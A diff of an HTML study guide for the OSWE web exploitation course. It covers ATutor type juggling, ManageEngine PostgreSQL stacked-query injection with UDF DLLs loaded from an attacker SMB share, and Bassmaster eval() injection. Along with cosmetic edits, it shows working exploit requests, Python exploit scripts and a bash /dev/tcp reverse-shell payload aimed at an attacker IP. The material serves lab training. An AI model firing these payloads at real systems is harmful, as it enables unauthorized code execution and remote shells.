@@ -100,9 +100,10 @@
 <p>Start with traffic inspection. A web proxy captures client requests and server responses for precise HTTP manipulation. Burp Suite Community Edition handles information gathering and request manipulation.</p>
 
 <h4 id="oswe-tools-burp-proxy">1.1.1 Burp Suite Proxy</h4>
-<p>Burp Suite includes an embedded Chromium browser preconfigured to proxy traffic through its listener on <code>127.0.0.1:8080</code>. Launch it from the <strong>Proxy &gt; Intercept</strong> tab by clicking <strong>Open Browser</strong>. The <strong>Intercept</strong> feature captures requests before forwarding or dropping them&mdash;toggle it on/off as needed.</p>
+<p>Burp Suite includes an embedded Chromium browser preconfigured to proxy traffic through its listener on <code>127.0.0.1:8080</code>. Launch it from the <strong>Proxy &gt; Intercept</strong> tab by clicking <strong>Open Browser</strong>. The <strong>Intercept</strong> feature captures requests before forwarding or dropping them. Toggle it on/off as needed.</p>
 
 <p>The <strong>HTTP history</strong> tab logs every request and response that passed through Burp Suite.</p>
+<figure><img src="./img/oswe/fig006-burp-suite-intercept-tab.png" alt="Burp Suite Intercept tab"></figure>
 
 <h4 id="oswe-tools-burp-browsers">1.1.2 Using Burp with Other Browsers</h4>
 <p>To configure Firefox manually, navigate to <code>about:preferences#advanced</code>, scroll to Network Settings, click Settings, and choose <strong>Manual proxy configuration</strong>. Set the HTTP proxy to <code>127.0.0.1</code> port <code>8080</code> and check "Use this proxy server for all protocols."</p>
@@ -283,8 +284,8 @@ public class test {
 <p>Transfer files to the target VM using Impacket's SMB server for JD-GUI analysis:</p>
 
 <pre><code class="language-bash"># Start an SMB share on Kali
-sudo impacket-smbserver [share-name] [local-path]
-# On Windows, access \\[attacker-ip]\[share-name] to copy files</code></pre>
+sudo impacket-smbserver test /path/to/jar/
+# On Windows, access \\[attacker-ip]\test to copy files</code></pre>
 
 <p>Use <strong>File &gt; Save All Sources</strong> in JD-GUI to export decompiled Java files for analysis in a text editor or IDE. The navigation pane allows browsing the package hierarchy and searching for arbitrary strings across all decompiled classes.</p>
 
@@ -300,12 +301,12 @@ sudo impacket-smbserver [share-name] [local-path]
 <pre><code class="language-bash"># Extract dependencies from a Spring Boot JAR for analysis
 unzip -j app.jar "BOOT-INF/lib/*" -d lib/</code></pre></li>
 <li><label><input type="checkbox"> Transfer compiled files between attacker and target using Impacket's SMB server</label>
-<pre><code class="language-bash">sudo impacket-smbserver [share-name] [local-path]
-# On Windows: copy from \\[attacker-ip]\[share-name]</code></pre></li>
+<pre><code class="language-bash">sudo impacket-smbserver share /path/to/files/
+# On Windows: copy from \\[attacker-ip]\share</code></pre></li>
 </ul>
 
 <h3 id="oswe-tools-analysis">1.4 Source Code Analysis Methodology</h3>
-<p>Walk through the application in a browser with Burp Suite proxying traffic first. Note the technologies in use, how routes are mapped, and how data flows — this narrows focus during source review.</p>
+<p>Walk through the application in a browser with Burp Suite proxying traffic first. Note the technologies in use, how routes are mapped, and how data flows - this narrows focus during source review.</p>
 
 <h4 id="oswe-tools-analysis-approach">1.4.1 Approach to Analysis</h4>
 <p>Data enters an application through a <strong>source</strong> (e.g., HTTP request handler) and is operated on at a <strong>sink</strong> (e.g., database query, system command). Manual source code analysis involves tracing the path between these two points and identifying where input validation or sanitization is absent.</p>
@@ -321,7 +322,7 @@ unzip -j app.jar "BOOT-INF/lib/*" -d lib/</code></pre></li>
 <p>Adapt both approaches as needed. The goal is always the same: find the vulnerability, reach the vulnerable code, and bypass any restrictions.</p>
 
 <h4 id="oswe-tools-ide">1.4.2 Using an IDE</h4>
-<p>Visual Studio Code supports multiple programming languages via extensions and provides advanced code search and debugging. Use the <strong>Toggle Search Details</strong> button (three dots) to refine searches by file type&mdash;for example, entering <code>*.java</code> in the "files to include" field limits results to Java source files.</p>
+<p>Visual Studio Code supports multiple programming languages via extensions and provides advanced code search and debugging. Use the <strong>Toggle Search Details</strong> button (three dots) to refine searches by file type. For example, entering <code>*.java</code> in the "files to include" field limits results to Java source files.</p>
 
 <p>Right-click any function or method name and select <strong>Find All References</strong> to locate all call sites. Search for unique keywords from application pages, error messages, and HTTP responses to narrow down relevant code paths. Regular expressions in VS Code searches help locate complex patterns like SQL query construction.</p>
 
@@ -397,7 +398,7 @@ grep -rn "exec(\|system(\|Runtime.getRuntime\|ProcessBuilder" --include="*.java"
 grep -rn "ObjectInputStream\|readObject\|BinaryFormatter\|XmlSerializer" --include="*.java" --include="*.cs" .</code></pre></li>
 <li><label><input type="checkbox"> Use VS Code <strong>Find All References</strong> (right-click a method) to trace call chains from sources to sinks</label></li>
 <li><label><input type="checkbox"> Prioritize unauthenticated entry points, then inspect authenticated areas that receive less scrutiny</label></li>
-<li><label><input type="checkbox"> Examine input sanitization at each step&mdash;determine whether it uses a trusted library or a custom solution prone to bypass</label></li>
+<li><label><input type="checkbox"> Examine input sanitization at each step and determine whether it uses a trusted library or a custom solution prone to bypass</label></li>
 <li><label><input type="checkbox"> Inspect account creation, password reset, and session management routines for logic flaws</label></li>
 </ul>
 
@@ -868,7 +869,7 @@ if ($row = mysql_fetch_assoc($result)) {
     // Redirect to dashboard
 }</code></pre>
 
-<p>With the cracked admin password, log in through the standard login form. The admin panel provides access to course management, user administration, and the file manager — which is the next target for achieving remote code execution.</p>
+<p>With the cracked admin password, log in through the standard login form. The admin panel provides access to course management, user administration, and the file manager - which is the next target for achieving remote code execution.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -895,7 +896,7 @@ if (in_array($ext, $illegal_extentions)) {
     exit;
 }</code></pre>
 
-<p>The blocklist does not include <code>.phtml</code>, <code>.php5</code>, <code>.php7</code>, <code>.pht</code>, or <code>.phar</code> — all of which Apache may execute as PHP depending on its configuration. Check the Apache configuration to determine which extensions are handled by the PHP module:</p>
+<p>The blocklist does not include <code>.phtml</code>, <code>.php5</code>, <code>.php7</code>, <code>.pht</code>, or <code>.phar</code> - all of which Apache may execute as PHP depending on its configuration. Check the Apache configuration to determine which extensions are handled by the PHP module:</p>
 
 <pre><code class="language-bash"># Check which extensions Apache maps to the PHP handler
 grep -rn "php" /etc/apache2/mods-enabled/php*.conf
@@ -1100,7 +1101,7 @@ curl "http://[target-ip]/[application-path]/content/shell.phtml" \
 <h2 id="oswe-typejuggling">3. ATutor LMS Type Juggling</h2>
 
 <h3 id="oswe-typejuggling-setup">3.1 Getting Started</h3>
-<p>ATutor has a second authentication bypass — this one exploits PHP's loose comparison operator in the password reset token validation logic, requiring no SQL injection at all.</p>
+<p>ATutor has a second authentication bypass - this one exploits PHP's loose comparison operator in the password reset token validation logic, requiring no SQL injection at all.</p>
 
 <table class="custom-table">
 <thead><tr><th>Attack Vector</th><th>Module 3 (SQLi)</th><th>Module 4 (Type Juggling)</th></tr></thead>
@@ -1143,10 +1144,10 @@ SET GLOBAL general_log_file = '/var/log/mysql/query.log';</code></pre></li>
 </table>
 
 <pre><code class="language-php">// Demonstration of loose comparison pitfalls
-var_dump("0e12345" == "0e99999");   // bool(true)  — both are 0.0
-var_dump("0e12345" === "0e99999");  // bool(false) — different strings
-var_dump("0e12345" == 0);           // bool(true)  — string parsed as 0
-var_dump("0e12345" == "0");         // bool(true)  — both coerce to 0
+var_dump("0e12345" == "0e99999");   // bool(true)  - both are 0.0
+var_dump("0e12345" === "0e99999");  // bool(false) - different strings
+var_dump("0e12345" == 0);           // bool(true)  - string parsed as 0
+var_dump("0e12345" == "0");         // bool(true)  - both coerce to 0
 
 // The fix: always use strict comparison for security-sensitive checks
 var_dump("0e12345" === "0e99999");  // bool(false)</code></pre>
@@ -1168,15 +1169,15 @@ var_dump("0e12345" === "0e99999");  // bool(false)</code></pre>
 // 3. Digits are consumed until a non-digit character
 // 4. 'e' or 'E' followed by digits = scientific notation
 
-var_dump((int)"123abc");     // int(123) — leading digits extracted
-var_dump((int)"abc");        // int(0)   — no leading digits
-var_dump((float)"0e12345");  // float(0) — 0 * 10^12345 = 0
-var_dump((float)"0e99999");  // float(0) — 0 * 10^99999 = 0
+var_dump((int)"123abc");     // int(123) - leading digits extracted
+var_dump((int)"abc");        // int(0)   - no leading digits
+var_dump((float)"0e12345");  // float(0) - 0 * 10^12345 = 0
+var_dump((float)"0e99999");  // float(0) - 0 * 10^99999 = 0
 
 // Both hash values below are "equal" under loose comparison:
 $hash_a = "0e462097431906509019562988736854";  // md5("240610708")
 $hash_b = "0e848240448830537924465865611904";  // md5("QNKCDZO")
-var_dump($hash_a == $hash_b);  // bool(true) — both are 0.0</code></pre>
+var_dump($hash_a == $hash_b);  // bool(true) - both are 0.0</code></pre>
 
 <table class="custom-table">
 <thead><tr><th>Input</th><th>MD5 Hash</th><th>Numeric Value</th></tr></thead>
@@ -1210,7 +1211,7 @@ $row = mysql_fetch_assoc($result);
 
 // VULNERABLE: loose comparison
 if ($token == $row['password_reminder']) {
-    // Token matches — allow password reset
+    // Token matches - allow password reset
     // ...
 }</code></pre>
 
@@ -1390,6 +1391,7 @@ xfreerdp +nego +sec-rdp +sec-tls +sec-nla /u:[username] /p:[password] /v:[target
     <label><input type="checkbox"> Connect to the ManageEngine VM via RDP</label>
     <pre><code class="language-bash">xfreerdp +nego +sec-rdp +sec-tls +sec-nla /u:[username] /p:[password] /v:[target-ip] /size:1180x708
 # Append /tls-seclevel:0 if ERRCONNECT_TLS_CONNECT_FAILED</code></pre>
+<figure><img src="./img/oswe/fig071-checking-out-the-properties-of-the-javaexe-process-spawned-b.png" alt="Checking out the properties of the Java.exe process, spawned by wrapper.exe"></figure>
   </li>
 <li><label><input type="checkbox"> Log in to ManageEngine at <code>https://[target-ip]:[port]</code> with default credentials (<code>admin / admin</code>)</label></li>
 <li><label><input type="checkbox"> Note <code>.do</code> URL extensions indicating Java servlet mappings; use Process Explorer to locate <code>java.exe</code> and its working directory</label></li>
@@ -1417,7 +1419,7 @@ xfreerdp +nego +sec-rdp +sec-tls +sec-nla /u:[username] /p:[password] /v:[target
 <h4 id="oswe-manageengine-source">4.2.2 Source Code Recovery</h4>
 <p>The <code>WEB-INF\lib</code> directory contains multiple JAR files. Most are third-party libraries; <strong>AdventNetAppManagerWebClient.jar</strong> is the primary ManageEngine application JAR to target. Decompile with JD-GUI and use <strong>File &gt; Save All Sources</strong> to export Java files for searching.</p>
 
-<p>A regex search for SQL queries returns ~5000 results — too many to review efficiently. Searching for HTTP handler implementations instead narrows the attack surface significantly.</p>
+<p>A regex search for SQL queries returns ~5000 results - too many to review efficiently. Searching for HTTP handler implementations instead narrows the attack surface significantly.</p>
 
 <pre><code class="language-bash"># Broad regex (too many results ~5000):
 ^.*?query.*?select.*?
@@ -1429,9 +1431,9 @@ doPost\(HttpServletRequest</code></pre>
 <table class="custom-table">
 <thead><tr><th>Search Strategy</th><th>Results</th><th>Usefulness</th></tr></thead>
 <tbody>
-<tr><td>Regex for SELECT queries</td><td>~5000</td><td>Low — too broad, most are internal</td></tr>
-<tr><td>Search for <code>doGet</code> implementations</td><td>~87</td><td>High — direct entry points for user input</td></tr>
-<tr><td>Search for <code>doPost</code> implementations</td><td>Variable</td><td>High — often redirects to <code>doGet</code></td></tr>
+<tr><td>Regex for SELECT queries</td><td>~5000</td><td>Low - too broad, most are internal</td></tr>
+<tr><td>Search for <code>doGet</code> implementations</td><td>~87</td><td>High - direct entry points for user input</td></tr>
+<tr><td>Search for <code>doPost</code> implementations</td><td>Variable</td><td>High - often redirects to <code>doGet</code></td></tr>
 </tbody>
 </table>
 
@@ -1546,9 +1548,9 @@ log_statement = 'all'
 </ul>
 
 <h3 id="oswe-manageengine-trigger">4.3 Triggering the Vulnerability</h3>
-<p>The original query uses no quoted strings around <code>userId</code>, so a simple semicolon terminates the first query and begins a stacked query. The HTTP response returns 200 OK with an empty body — no verbose error is exposed to the attacker in a black-box scenario.</p>
+<p>The original query uses no quoted strings around <code>userId</code>, so a simple semicolon terminates the first query and begins a stacked query. The HTTP response returns 200 OK with an empty body - no verbose error is exposed to the attacker in a black-box scenario.</p>
 
-<pre><code class="language-bash"># Trigger request — semicolon breaks the SQL query
+<pre><code class="language-bash"># Trigger request - semicolon breaks the SQL query
 GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&amp;userId=1; HTTP/1.1
 Host: [target-ip]:8443
 
@@ -1598,7 +1600,7 @@ if __name__ == '__main__':
 <table class="custom-table">
 <thead><tr><th>Injection Technique</th><th>Feasibility</th><th>Notes</th></tr></thead>
 <tbody>
-<tr><td>UNION-based</td><td>Limited</td><td><code>RESOURCEID</code> is BIGINT — can only extract integer data</td></tr>
+<tr><td>UNION-based</td><td>Limited</td><td><code>RESOURCEID</code> is BIGINT - can only extract integer data</td></tr>
 <tr><td>Boolean blind (stacked)</td><td>Broken</td><td>Multiple ResultSets error breaks application logic</td></tr>
 <tr><td>Time-based blind (stacked)</td><td>Reliable</td><td>Use <code>pg_sleep()</code> with conditional statements</td></tr>
 </tbody>
@@ -1609,7 +1611,7 @@ if __name__ == '__main__':
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Construct the trigger URL with required parameters (<code>ForMasRange</code> and <code>userId</code>) and inject a semicolon to confirm query splitting</label>
 <pre><code class="language-bash">curl -k "https://[target-ip]:[port]/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;"</code></pre></li>
-<li><label><input type="checkbox"> Verify the injection in PostgreSQL logs — look for a syntax error confirming the query was split</label>
+<li><label><input type="checkbox"> Verify the injection in PostgreSQL logs - look for a syntax error confirming the query was split</label>
 <pre><code class="language-sql">-- Expected log output:
 -- LOG:  execute: select distinct(RESOURCEID) ... where USERID=1
 -- ERROR: syntax error at or near "and"</code></pre></li>
@@ -1670,7 +1672,7 @@ COPY test(col) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;</code
 <li><label><input type="checkbox"> Confirm <code>CHR()</code> fails for function arguments like <code>COPY TO</code> filename parameters</label></li>
 <li><label><input type="checkbox"> Use dollar-quoted string constants (<code>$$</code>) as a full bypass for single-quote restrictions</label>
 <pre><code class="language-sql">-- Dollar-quoting works everywhere, including COPY TO:
-COPY (SELECT $$[file-content]$$) TO $$C:\[output-file].txt$$;</code></pre></li>
+COPY (SELECT $$payload$$) TO $$C:\output.txt$$;</code></pre></li>
 </ul>
 
 <h3 id="oswe-manageengine-exploitation">4.5 Exploitation</h3>
@@ -1691,22 +1693,22 @@ Host: [target-ip]:8443
 <p>With DBA privileges, PostgreSQL's <code>COPY</code> function enables reading from and writing to the filesystem. Writing uses a subquery with <code>COPY TO</code>, while reading requires creating a temporary table and importing file contents with <code>COPY FROM</code>.</p>
 
 <pre><code class="language-sql">-- Write a file to disk:
-COPY (SELECT $$[file-content]$$) TO $$C:\\[output-file].txt$$;
+COPY (SELECT $$offsec$$) TO $$C:\\offsec.txt$$;
 
 -- Read a file from disk (requires temp table):
 CREATE TEMP TABLE temp_tbl (content text);
-COPY temp_tbl FROM $$C:\\[target-file].txt$$;
+COPY temp_tbl FROM $$C:\\target_file.txt$$;
 SELECT content FROM temp_tbl;
 DROP TABLE temp_tbl;</code></pre>
 
 <p>Time-based file reading via injection extracts content byte-by-byte using <code>ascii()</code> and <code>substr()</code>. This technique works for both text and binary files.</p>
 
 <pre><code class="language-bash"># Read first character of a file via time-based injection:
-GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&amp;userId=1;CREATE+TEMP+TABLE+tbl(content+text);COPY+tbl+FROM+$$c:\[target-file].txt$$;SELECT+CASE+WHEN(ascii(substr((SELECT+content+FROM+tbl),1,1))=104)+THEN+pg_sleep(10)+END;--+
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&amp;userId=1;CREATE+TEMP+TABLE+tbl(content+text);COPY+tbl+FROM+$$c:\target.txt$$;SELECT+CASE+WHEN(ascii(substr((SELECT+content+FROM+tbl),1,1))=104)+THEN+pg_sleep(10)+END;--+
 Host: [target-ip]:8443
 
 # Write a file via injection:
-GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&amp;userId=1;COPY+(SELECT+$$[file-content]$$)+TO+$$c:\\[output-file].txt$$;--+
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&amp;userId=1;COPY+(SELECT+$$offsec$$)+TO+$$c:\\offsec.txt$$;--+
 Host: [target-ip]:8443</code></pre>
 
 <p>The web application runs under the <strong>SYSTEM</strong> user context, meaning files are written with full system privileges.</p>
@@ -1740,7 +1742,7 @@ TO $$C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\applica
 <li><label><input type="checkbox"> Verify DBA privileges via time-based injection with <code>current_setting($$is_superuser$$)</code></label>
 <pre><code class="language-bash">curl -k "https://[target-ip]:[port]/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+CASE+WHEN+(SELECT+current_setting($$is_superuser$$))=$$on$$+THEN+pg_sleep(10)+END;--+"</code></pre></li>
 <li><label><input type="checkbox"> Write a test file to disk using <code>COPY TO</code> with dollar-quoted paths to confirm filesystem access</label>
-<pre><code class="language-sql">COPY (SELECT $$[file-content]$$) TO $$C:\\[output-file].txt$$;</code></pre></li>
+<pre><code class="language-sql">COPY (SELECT $$offsec$$) TO $$C:\\offsec.txt$$;</code></pre></li>
 <li><label><input type="checkbox"> Read files via temporary table with <code>COPY FROM</code>, then extract content byte-by-byte using <code>ascii(substr(...))</code> and <code>pg_sleep()</code></label></li>
 <li><label><input type="checkbox"> Identify a periodically executed script (e.g., <code>wmiget.vbs</code>) suitable for payload injection</label></li>
 <li><label><input type="checkbox"> Generate a VBS meterpreter payload, base64-encode it, and write it to the target script path via <code>COPY TO</code></label>
@@ -1753,7 +1755,7 @@ TO $$C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\applica
 <h3 id="oswe-manageengine-extensions">4.6 PostgreSQL Extensions</h3>
 
 <h4 id="oswe-manageengine-udf">4.6.1 Building a Custom UDF</h4>
-<p>PostgreSQL can load custom C extensions as User Defined Functions (UDFs). The extension DLL must include the <code>PG_MODULE_MAGIC</code> macro — loading system DLLs like <code>kernel32.dll</code> fails with "missing magic block." The ManageEngine VM includes a pre-configured Visual Studio 2017 build environment.</p>
+<p>PostgreSQL can load custom C extensions as User Defined Functions (UDFs). The extension DLL must include the <code>PG_MODULE_MAGIC</code> macro - loading system DLLs like <code>kernel32.dll</code> fails with "missing magic block." The ManageEngine VM includes a pre-configured Visual Studio 2017 build environment.</p>
 
 <pre><code class="language-sql">-- Attempting to load a system DLL fails:
 CREATE OR REPLACE FUNCTION system(cstring) RETURNS int
@@ -1790,7 +1792,7 @@ Datum awae(PG_FUNCTION_ARGS) {
 <pre><code class="language-sql">-- Create and test the UDF:
 CREATE OR REPLACE FUNCTION test(text, integer) RETURNS void
     AS $$C:\[dll-name].dll$$, $$[function-name]$$ LANGUAGE C STRICT;
-SELECT test($$[command]$$, [integer-argument]);
+SELECT test($$calc.exe$$, 3);
 
 -- Cleanup procedure:
 -- 1. net stop "Applications Manager"
@@ -1799,15 +1801,15 @@ SELECT test($$[command]$$, [integer-argument]);
 -- 4. DROP FUNCTION test(text, integer);</code></pre>
 
 <h4 id="oswe-manageengine-remote-udf">4.6.2 Loading UDF from Remote Share</h4>
-<p>PostgreSQL does not restrict DLL paths to local files — UNC paths to network shares work too. Host the malicious DLL on the attacker's machine via an SMB share and load it directly into PostgreSQL without uploading the file first.</p>
+<p>PostgreSQL does not restrict DLL paths to local files - UNC paths to network shares work too. Host the malicious DLL on the attacker's machine via an SMB share and load it directly into PostgreSQL without uploading the file first.</p>
 
 <pre><code class="language-bash"># Start SMB server on Kali:
-mkdir [local-path]
-sudo impacket-smbserver [share-name] [local-path]</code></pre>
+mkdir /home/kali/awae
+sudo impacket-smbserver awae /home/kali/awae/</code></pre>
 
 <pre><code class="language-sql">-- Create UDF from remote SMB share:
 CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void
-    AS $$\\[attacker-ip]\[share-name]\[dll-name].dll$$, $$[function-name]$$ LANGUAGE C STRICT;
+    AS $$\\[attacker-ip]\awae\awae.dll$$, $$[function-name]$$ LANGUAGE C STRICT;
 SELECT remote_test($$[command]$$, [integer-argument]);</code></pre>
 
 <h4 id="oswe-manageengine-udf-revshell">4.6.3 UDF Reverse Shell</h4>
@@ -1874,7 +1876,7 @@ def make_request(url, sql):
 
 def create_udf_func(url):
     log("[+] Creating function...")
-    sql = "CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS $$\\\\[attacker-ip]\\[share-name]\\[dll-name].dll$$, $$connect_back$$ LANGUAGE C STRICT"
+    sql = "CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS $$\\\\[attacker-ip]\\awae\\rev_shell.dll$$, $$connect_back$$ LANGUAGE C STRICT"
     make_request(url, sql)
 
 def trigger_udf(url, ip, port):
@@ -1902,13 +1904,13 @@ if __name__ == '__main__':
 <li><label><input type="checkbox"> Test the UDF locally via <code>CREATE OR REPLACE FUNCTION</code> and <code>SELECT</code> to confirm code execution</label>
 <pre><code class="language-sql">CREATE OR REPLACE FUNCTION test(text, integer) RETURNS void
     AS $$C:\[dll-name].dll$$, $$[function-name]$$ LANGUAGE C STRICT;
-SELECT test($$[command]$$, [integer-argument]);</code></pre></li>
+SELECT test($$calc.exe$$, 3);</code></pre></li>
 <li><label><input type="checkbox"> Host the compiled DLL on an attacker SMB share and load it remotely via UNC path</label>
-<pre><code class="language-bash">sudo impacket-smbserver [share-name] [local-path]</code></pre></li>
+<pre><code class="language-bash">sudo impacket-smbserver awae /home/kali/awae/</code></pre></li>
 <li><label><input type="checkbox"> Create a reverse shell UDF with Winsock (<code>WSASocket</code>, <code>WSAConnect</code>, <code>CreateProcess</code>) that accepts IP and port as function arguments</label></li>
 <li><label><input type="checkbox"> For environments without SMB access, use PostgreSQL Large Objects to transfer the DLL binary through SQL injection</label>
 <pre><code class="language-sql">SELECT lo_import($$C:\\[dll-name].dll$$, 1337);
-SELECT lo_export(1337, $$C:\\[target-path]\\[dll-name].dll$$);</code></pre></li>
+SELECT lo_export(1337, $$C:\\target_path\\rev_shell.dll$$);</code></pre></li>
 <li><label><input type="checkbox"> Start a netcat listener and trigger the reverse shell UDF</label>
 <pre><code class="language-bash">nc -nlvp [listener-port]
 # Then via injection:
@@ -2051,7 +2053,7 @@ if __name__ == '__main__':
     <pre><code class="language-sql">SELECT CASE WHEN (SELECT current_setting($$is_superuser$$))=$$on$$ THEN pg_sleep(10) END;</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-4-5"> Write files via COPY TO or overwrite application scripts</label>
-    <pre><code class="language-sql">COPY (SELECT $$[file-content]$$) TO $$C:\\[output-file].txt$$;</code></pre>
+    <pre><code class="language-sql">COPY (SELECT $$payload$$) TO $$C:\\output.txt$$;</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-4-6"> Upload UDF via Large Objects (split into 2KB pages, hex-encode)</label>
     <pre><code class="language-sql">SELECT lo_import($$C:\\windows\\win.ini$$, 1337);
@@ -2072,7 +2074,7 @@ SELECT rev_shell($$[attacker-ip]$$, [listener-port]);</code></pre>
 
 <h2 id="oswe-bassmaster">5. Bassmaster NodeJS Arbitrary JavaScript Injection</h2>
 
-<h3 id="oswe-bassmaster-overview">Overview</h3>
+<h3 id="oswe-bassmaster-overview">5.1 Overview</h3>
 
 <p>Bassmaster is a batch processing plugin for <strong>Hapi.js</strong>, a Node.js web framework. The plugin exposes a <code>/batch</code> endpoint that accepts multiple API requests in a single HTTP call. Each request in the batch can reference results from previous requests using <code>$N.path.to.value</code> syntax.</p>
 
@@ -2109,9 +2111,9 @@ grep -rn "bassmaster" server.js app.js index.js 2>/dev/null</code></pre></li>
 <pre><code class="language-bash">grep -n "eval(" node_modules/bassmaster/lib/batch.js</code></pre></li>
 </ul>
 
-<h3 id="oswe-bassmaster-hapijs">Hapi.js Framework and Plugin Architecture</h3>
+<h3 id="oswe-bassmaster-hapijs">5.2 Hapi.js Framework and Plugin Architecture</h3>
 
-<h4 id="oswe-bassmaster-routes">5.0.1 Route Configuration</h4>
+<h4 id="oswe-bassmaster-routes">5.2.1 Route Configuration</h4>
 <p>Hapi.js routes are declared with a method, path, and handler function. Plugins extend the server by registering additional routes, authentication strategies, or request lifecycle hooks.</p>
 
 <pre><code class="language-javascript">// Hapi.js route configuration structure
@@ -2140,7 +2142,7 @@ server.register({
 
 server.start();</code></pre>
 
-<h4 id="oswe-bassmaster-plugin-reg">5.0.2 Plugin Registration</h4>
+<h4 id="oswe-bassmaster-plugin-reg">5.2.2 Plugin Registration</h4>
 <p>The Bassmaster plugin registers the <code>/batch</code> endpoint during initialization. The <code>batchEndpoint</code> option controls the URL path. The server then accepts POST requests to <code>/batch</code> with a JSON array of sub-requests.</p>
 
 <pre><code class="language-javascript">// Bassmaster plugin registration (lib/index.js)
@@ -2174,7 +2176,7 @@ grep -rn "batchEndpoint" --include="*.js" .</code></pre></li>
 <pre><code class="language-bash">cat node_modules/bassmaster/lib/index.js</code></pre></li>
 </ul>
 
-<h3 id="oswe-bassmaster-batch-protocol">Batch Request Protocol</h3>
+<h3 id="oswe-bassmaster-batch-protocol">5.3 Batch Request Protocol</h3>
 
 <p>The <code>/batch</code> endpoint accepts a JSON object with a <code>requests</code> array. Each element specifies a <code>method</code> and <code>path</code> for an internal API call. The server executes each sub-request sequentially and collects the responses.</p>
 
@@ -2197,7 +2199,7 @@ curl -s -X POST http://[target-ip]:[port]/batch \
     { "statusCode": 200, "payload": { "id": "2", "name": "guest" }, "headers": {} }
 ]</code></pre>
 
-<h4 id="oswe-bassmaster-references">5.0.3 Inter-Request References</h4>
+<h4 id="oswe-bassmaster-references">5.3.1 Inter-Request References</h4>
 
 <p>Bassmaster supports referencing results from earlier requests in the batch using <code>$N</code> notation, where <code>N</code> is the zero-indexed position of the prior request. The reference resolves to a property path on the response object.</p>
 
@@ -2235,7 +2237,7 @@ curl -s -X POST http://[target-ip]:[port]/batch \
 <li><label><input type="checkbox"> Verify response format returns ordered results matching request indices</label></li>
 </ul>
 
-<h3 id="oswe-bassmaster-vuln-discovery">Vulnerability Discovery</h3>
+<h3 id="oswe-bassmaster-vuln-discovery">5.4 Vulnerability Discovery</h3>
 
 <p>The vulnerability is in the reference resolution logic within <code>internals.batch()</code>. When a request path contains a <code>$N</code> reference, Bassmaster splits the reference on <code>.</code> and iterates through the parts to resolve the property chain. The resolution uses <code>eval()</code> to dereference each path segment.</p>
 
@@ -2280,7 +2282,7 @@ internals.batch = function (request, settings, reply) {
 </tbody>
 </table>
 
-<h4 id="oswe-bassmaster-safe-alternative">5.0.4 Safe Alternative</h4>
+<h4 id="oswe-bassmaster-safe-alternative">5.4.1 Safe Alternative</h4>
 
 <p>The fix (bassmaster 1.5.2+) replaced <code>eval()</code> with iterative property access using bracket notation:</p>
 
@@ -2306,11 +2308,11 @@ diff node_modules/bassmaster/lib/batch.js /path/to/fixed/batch.js</code></pre></
 <li><label><input type="checkbox"> Verify no allowlist, regex filter, or sandboxing exists between the path input and the <code>eval()</code> sink</label></li>
 </ul>
 
-<h3 id="oswe-bassmaster-triggering">Triggering the Vulnerability</h3>
+<h3 id="oswe-bassmaster-triggering">5.5 Triggering the Vulnerability</h3>
 
 <p>The injection requires at least two requests in the batch: the first provides a valid result object (so <code>ref</code> is not null), and the second contains the injected JavaScript in its path after the <code>$0.</code> reference prefix.</p>
 
-<h4 id="oswe-bassmaster-poc">5.0.5 Proof of Concept</h4>
+<h4 id="oswe-bassmaster-poc">5.5.1 Proof of Concept</h4>
 
 <pre><code class="language-bash"># PoC: execute arbitrary JavaScript via batch reference
 curl -s -X POST http://[target-ip]:[port]/batch \
@@ -2336,7 +2338,7 @@ curl -s -X POST http://[target-ip]:[port]/batch \
     ]
 }'</code></pre>
 
-<h4 id="oswe-bassmaster-cmd-exec">5.0.6 Command Execution</h4>
+<h4 id="oswe-bassmaster-cmd-exec">5.5.2 Command Execution</h4>
 
 <p>Node.js <code>child_process</code> provides synchronous and asynchronous methods for OS command execution. For injection via <code>eval()</code>, <code>execSync()</code> returns command output directly, while <code>exec()</code> runs asynchronously and requires a callback.</p>
 
@@ -2394,7 +2396,7 @@ curl -s -X POST http://[target-ip]:[port]/batch \
   -d '{"requests":[{"method":"get","path":"/api/users/1"},{"method":"get","path":"/$0.require(\"child_process\").exec(\"bash -c \\\"bash -i >& /dev/tcp/[attacker-ip]/[listener-port] 0>&1\\\"\")"}]}'</code></pre></li>
 </ul>
 
-<h3 id="oswe-bassmaster-reverse-shell">Obtaining a Reverse Shell</h3>
+<h3 id="oswe-bassmaster-reverse-shell">5.6 Obtaining a Reverse Shell</h3>
 
 <p>For a stable reverse shell, use the asynchronous <code>exec()</code> method with a bash reverse shell one-liner. The shell command must be properly escaped for JSON and JavaScript string contexts.</p>
 
@@ -2411,10 +2413,10 @@ curl -s -X POST http://[target-ip]:[port]/batch \
     ]
 }'</code></pre>
 
-<h4 id="oswe-bassmaster-python-exploit">5.0.7 Automated Python Exploit</h4>
+<h4 id="oswe-bassmaster-python-exploit">5.6.1 Automated Python Exploit</h4>
 
 <pre><code class="language-python">#!/usr/bin/env python3
-"""Bassmaster CVE-2014-7205 — eval() injection to reverse shell."""
+"""Bassmaster CVE-2014-7205 - eval() injection to reverse shell."""
 
 import argparse
 import json
@@ -2443,7 +2445,7 @@ def check_vuln(target, batch_path="/batch", api_path="/api/users/1"):
     if resp.status_code == 200:
         data = resp.json()
         if len(data) > 1 and data[1].get("statusCode") != 404:
-            print(f"[+] Vulnerable — hostname: {data[1].get('payload', 'unknown')}")
+            print(f"[+] Vulnerable - hostname: {data[1].get('payload', 'unknown')}")
             return True
     print("[-] Target does not appear vulnerable")
     return False
@@ -2465,7 +2467,7 @@ def reverse_shell(target, lhost, lport, batch_path="/batch", api_path="/api/user
     try:
